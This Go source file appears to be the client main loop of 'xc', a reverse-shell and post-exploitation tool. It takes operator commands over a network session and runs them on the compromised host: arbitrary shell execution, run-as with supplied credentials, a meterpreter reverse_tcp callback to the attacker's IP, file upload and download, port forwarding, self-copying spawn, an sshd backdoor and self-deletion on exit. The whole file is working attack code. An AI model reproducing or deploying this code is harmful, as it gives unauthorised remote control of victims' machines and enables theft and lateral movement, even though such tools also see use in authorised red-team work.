package client

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/user"
	"strconv"
	"strings"

	"../meter"
	"../plugins"
	"../shell"
	"../utils"
	"github.com/hashicorp/yamux"
)

// Run runs the mainloop of the shell
func Run(s *yamux.Session, c net.Conn) {
	defer c.Close()
	scanner := bufio.NewScanner(c)
	usr, _ := user.Current()
	homedir := usr.HomeDir
	// init
	plugins.Init(c)
	prompt(c)

	for scanner.Scan() {
		command := scanner.Text()
		if len(command) > 1 {
			argv := strings.Split(command, " ")
			// we only handle commands here that do something on the client side
			switch argv[0] {
			case "!help":
				usage := "Usage:\n"
				usage += " !runas <username> <password> <domain>\n"
				usage += "   - restart xc with the specified user\n"
				usage += " !met <port>\n"
				usage += "   - connects to a x64/meterpreter/reverse_tcp listener\n"
				usage += " !upload <src> <dst>\n"
				usage += "   - uploads a file to the target\n"
				usage += " !download <src> <dst>\n"
				usage += "   - downloads a file from the target\n"
				usage += " !lfwd <localport> <remoteaddr> <remoteport>\n"
				usage += "   - local portforwarding (like ssh -L)\n"
				usage += " !rfwd <remoteport> <localaddr> <localport>\n"
				usage += "   - remote portforwarding (like ssh -R)\n"
				usage += " !plugins\n"
				usage += "   - lists available plugins\n"
				usage += " !plugin <plugin>\n"
				usage += "   - execute a plugin\n"
				usage += " !spawn <port>\n"
				usage += "   - spawns another client on the specified port\n"
				usage += " !shell\n"
				usage += "   - runs /bin/sh\n"
				usage += " !ssh <port>\n"
				usage += "   - starts sshd with the configured keys on the specified port\n"
				usage += " !exit\n"
				c.Write([]byte(usage))
				prompt(c)
			case "!runas":
				if len(argv) != 4 {
					c.Write([]byte("Usage: !runas <username> <password> <domain>\n"))
				} else {
					shell.RunAs(argv[1], argv[2], argv[3], c)
				}
				prompt(c)
			case "!met":
				if len(argv) > 1 {
					port := argv[1]
					ip := strings.Split(c.RemoteAddr().String(), ":")[0]
					ok, err := meter.Connect(ip, port)
					if !ok {
						c.Write([]byte(err.Error() + "\n"))
					}
				} else {
					c.Write([]byte("Usage: met <port>\n"))
				}
				prompt(c)
			case "!upload":
				if len(argv) == 3 {
					dst := argv[2]
					// from the clients perspective we are downloading a file
					utils.UploadConnect(dst, s)
					c.Write([]byte("[+] Upload complete\n"))
				} else {
					c.Write([]byte("Usage: !upload <src> <dst>\n"))
				}
				prompt(c)
			case "!download":
				if len(argv) == 3 {
					src := argv[1]
					utils.DownloadConnect(src, s)
					c.Write([]byte("[+] Download complete\n"))
				} else {
					c.Write([]byte("Usage: !download <src> <dst>\n"))
				}
				prompt(c)
			case "!lfwd":
				if len(argv) == 4 {
					host := argv[2]
					port := argv[3]
					go lfwd(host, port, s, c)
				} else {
					c.Write([]byte("Usage: !lfwd <localport> <remoteaddr> <remoteport> (opens local port)\n"))
				}
				prompt(c)
			case "!rfwd":
				if len(argv) == 4 {
					port := argv[1]
					go rfwd(port, s, c)
				} else {
					c.Write([]byte("Usage: !rfwd <remoteport> <localaddr> <localport> (opens remote port)\n"))
				}
				prompt(c)
			case "!shell":
				log.Println("Entering shell")
				cmd := shell.Shell()
				rp, wp := io.Pipe()
				cmd.Stdin = c
				cmd.Stdout = wp
				cmd.Stderr = c
				go io.Copy(c, rp)
				cmd.Run()
				log.Println("Exiting shell")
				prompt(c)
			case "!plugins":
				out := ""
				for _, s := range plugins.List() {
					out += s
					out += ", "
				}
				if len(out) > 0 {
					out = out[:len(out)-2] + "\n"
					c.Write([]byte(out))
				}
				prompt(c)
			case "!plugin":
				if len(argv) == 2 {
					pluginName := argv[1]
					plugins.Execute(pluginName, c)
				} else {
					c.Write([]byte("Usage: !plugin <name>\n"))
				}
				prompt(c)
			case "!spawn":
				if len(argv) == 2 {
					port := argv[1]
					path := shell.CopySelf()
					ip, _ := utils.SplitAddress(c.RemoteAddr().String())
					cmd := fmt.Sprintf("%s %s %s\r\n", path, ip, port)
					go shell.ExecSilent(cmd, c)
				} else {
					c.Write([]byte("Usage: !spawn <port>\n"))
				}
				prompt(c)
			case "!exit":
				log.Println("Bye!")
				shell.Seppuku(c)
				os.Exit(0)
			case "cd":
				if len(argv) == 2 {
					dir := strings.ReplaceAll(argv[1], "~", homedir)
					err := os.Chdir(dir)
					if err != nil {
						c.Write([]byte("Unable to change dir: " + err.Error() + "\n"))
					}
				} else {
					c.Write([]byte("Usage: cd <directory>\n"))
				}
				prompt(c)
			case "!ssh":
				if len(argv) == 2 {
					port, err := strconv.Atoi(argv[1])
					if err == nil {
						shell.StartSSHServer(port, c)
					} else {
						fmt.Println(err)
					}
				} else {
					c.Write([]byte("Usage: !ssh <port>\n"))
				}
				prompt(c)
			default:
				shell.Exec(command, c)
				prompt(c)
			}
		} else {
			prompt(c)
		}
	}
}
